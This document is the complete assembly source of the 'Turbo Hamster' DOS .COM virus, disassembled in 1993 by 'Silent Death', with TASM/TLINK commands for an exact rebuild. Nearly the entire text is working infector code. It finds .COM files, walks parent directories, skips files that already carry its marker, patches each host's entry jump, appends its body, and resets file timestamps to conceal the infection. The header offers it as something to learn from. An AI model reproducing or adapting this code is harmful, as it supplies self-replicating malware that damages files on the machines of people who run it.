Comment|
************************************************************************
  Virus Name: Turbo Hamster Virus!
  Effective Length: 546 bytes
  Disassembled by Silent Death - 1993

  Notes:
        - non-resident .COM infector
        This is a very poorly written .COM infector.  Something that you
would expect from a beginner.  But for a beginner it is good.  The code
is not too tight as blocks of code were copied when they could have
saved space and made them procedures, and there is a lot of useless
bytes at the end.  Other than that it works.  Use it to learn from.  Its
very basic.

  To Compile: [ Exact byte matchup! ]
        TASM /m File.asm
        TLINK /t FILE.obj
************************************************************************|

        .model tiny                    ;| Turbo hamster Virus
        .code                          ;| Disassembled by Silent Death
        org     100h                   ;| => 1993

start:
        jmp     virus
        nop
virus:
        call    delta
delta:                                  ; set up the delta offset
        pop     bp
        sub     bp,offset delta

        mov     word ptr cs:[bp+dumbstuff],2E9h ; ????

        mov     cx,3                    ; restore original start
        mov     si,offset origstart
        add     si,bp
        mov     di,100h
        rep     movsb

        mov     cx,12                   ; move our filename into new
        mov     si,offset file1         ; buffer
        add     si,bp
        mov     di,offset file2
        add     di,bp
        call    movestrings

        mov     ah,1Ah                  ; set dta
        mov     dx,offset dta           ; put into heap
        add     dx,bp
        int     21h

        mov     dx,offset filespec      ; files to find
findfirstfile:
        add     dx,bp
        xor     cx,cx                   ; normal attributes

        mov     ah,4Eh                  ; find first file
        int     21h                     

        jnc     checkfilename           ; jump if file found
        cmp     ax,2                    ; was file not found?
        je      newdir                  ; yup so jump
        cmp     ax,3                    ; was path not found?
        jmp     returntohost            ; quit virus

checkfilename:
        mov     cx,12
        mov     si,offset dta+1eh       ; filename in dta
        add     si,bp
        mov     di,offset file2
        add     di,bp
        repe    cmpsb                   ; compare file found to current
                                        ; file name
        db       83h,0F9h, 00h          ; cmp cx,0
                                        ; were the filenames equal?
        jz      findnextfile            ; yup find another file

        cmp     byte ptr [di],0         ; did one filename end in 0?
        je      findnextfile            ; yup so find another file

        jmp     short openfile

findnextfile:
        mov     ah,4Fh                  ; find next filename
        int     21h                     
        jnc     checkfilename2          ; if file found then jump

newdir:
        sub     word ptr cs:[bp+dumbstuff],3
        mov     dx,word ptr cs:[bp+dumbstuff]
        add     dx,bp                   ; => filename in dta

        mov     si,offset dotdot        ; move dotdot to dta filename
        add     si,bp                   ; set up new dir to change to
        mov     di,dx
        mov     cx,3
        rep     movsb

        mov     di,offset file1
        add     di,bp
        mov     cx,6
        rep     movsb                   
        jmp     short findfirstfile

checkfilename2:
        mov     cx,12
        mov     si,offset dta+1eh       ; filename in dta
        add     si,bp
        mov     di,offset file2         ; our filename
        add     di,bp
        repe    cmpsb                   ; are filenames equal
        db      83h,0F9h, 00h           ; cmp cx,0
                                        ; are they equal
        jz      findnextfile            ; yup so find another file
        cmp     byte ptr [di],0         ; did one end in 0
        je      findnextfile            ; yup find another file

openfile:
        mov     si,offset dta+1ah       ; get file size
        add     si,bp
        lodsw                           ; ax has filesize
        sub     ax,3                    ; calculate new jump

        mov     word ptr cs:[bp+newjump],ax; save in buffer
        mov     cx,12
        mov     si,offset dta+1eh       ; filename in dta
        add     si,bp
        mov     di,offset file1         ; move to here
        add     di,bp
        call    movestrings             ; move it

        mov     dx,word ptr cs:[bp+dumbstuff]
        add     dx,bp                   ; => filename

        mov     ax,3D02h                ; open file r/w
        int     21h                     
        mov     bx,ax                   ; handle to bx

        mov     ax,4200h                ; file ptr to start
        xor     cx,cx
        mov     dx,word ptr cs:[bp+newjump]; filesize-3
        db      83h,0EAh, 11h           ; sub dx,11h to get to vname
        int     21h                     ; so we can check for infection

        mov     ah,3Fh                  ; read from file
        mov     cx,2                    ; two bytes
        mov     dx,offset origstart
        add     dx,bp
        int     21h                     

        mov     ax,word ptr cs:[bp+origstart] ; get marker
        cmp     ax,word ptr cs:[bp+vname]; is file an infected?
        jne     infectfile                   ; nope so continue

        mov     ah,3Eh                  ; close file
        int     21h                     

        jmp     findnextfile

infectfile:
        mov     ax,4200h                ; file pointer to start
        xor     cx,cx
        xor     dx,dx
        int     21h

        mov     ah,3Fh                  ; read in original start
        mov     cx,3                    ; three bytes
        mov     dx,offset origstart
        add     dx,bp
        int     21h                     

        mov     ax,word ptr cs:[bp+exestart]; is file an exe?
        cmp     ax,word ptr cs:[bp+origstart]
        jne     finishinfection         ; nope so continue

        mov     ah,3Eh                  ; close file
        int     21h                     
        jmp     findnextfile

finishinfection:
        mov     ax,4200h                ; file pointer to start
        xor     cx,cx
        xor     dx,dx
        int     21h

        mov     ah,40h                  ; write to file
        mov     cx,3                    ; three bytes
        mov     dx,offset jump          ; new jump
        add     dx,bp
        int     21h

        mov     ax,4202h                ; file pointer to end
        xor     cx,cx
        xor     dx,dx
        int     21h

        mov     ah,40h                  ; write virus to the end
        mov     cx,dta-virus            ; size of virus
        mov     dx,bp                   ; start of virus
        add     dx,offset virus         ; start here
        int     21h                     

        mov     ax,5701h                ; set file date+time
        mov     cx,word ptr cs:[bp+dta+16h]; get original time
        mov     dx,word ptr cs:[bp+dta+18h]; get original date
        int     21h

        jmp     short closeup


movestrings:
msloop1:
        lodsb                           ; String [si] to al
        cmp     al,0                    ; is it the end?
        je      msloop2                 ; yup
        stosb                           ; Store al to es:[di]
        loop    msloop1

        mov     al,0                    ; mark the end with 0
        mov     cx,1                    ; only loop once

msloop2:
        stosb                           ; Store al to es:[di]
        loop    msloop2                 ; Loop if cx > 0
        retn

closeup:
        mov     ah,3Eh                  ; close file
        int     21h

returntohost:
        add     bp,offset jmpseg
        mov     [bp],cs                 ; we jump in our own segment
        mov     ax,cs                   ; reset all segments
        mov     ds,ax
        mov     es,ax
        xor     ax,ax                   ; clear all registers
        xor     bx,bx                 
        xor     cx,cx                 
        xor     dx,dx                 
        xor     si,si                 
        xor     di,di
        xor     bp,bp
        db      0eah                    ; jmp ssss:oooo
        dw      0100h                   ; offset 100h
jmpseg  dw      0000

jump      db    0E9h
newjump   dw    6100h
          db    2 dup (0)
dumbstuff db    0E9h, 02h, 00h
          db    63 dup (0)
file1     db    'BAIT.COM', 0, 0, 0, 0, 0
file2     db    'HAMSTER.COM', 0, 0
dotdot    db    '..\'
filespec  db    '*.COM', 00h
origstart db    0cdh,20h,90h
exestart  db    'MZ'
vname     db    'Turbo Hamster Virus!'
dta:
        end     start
        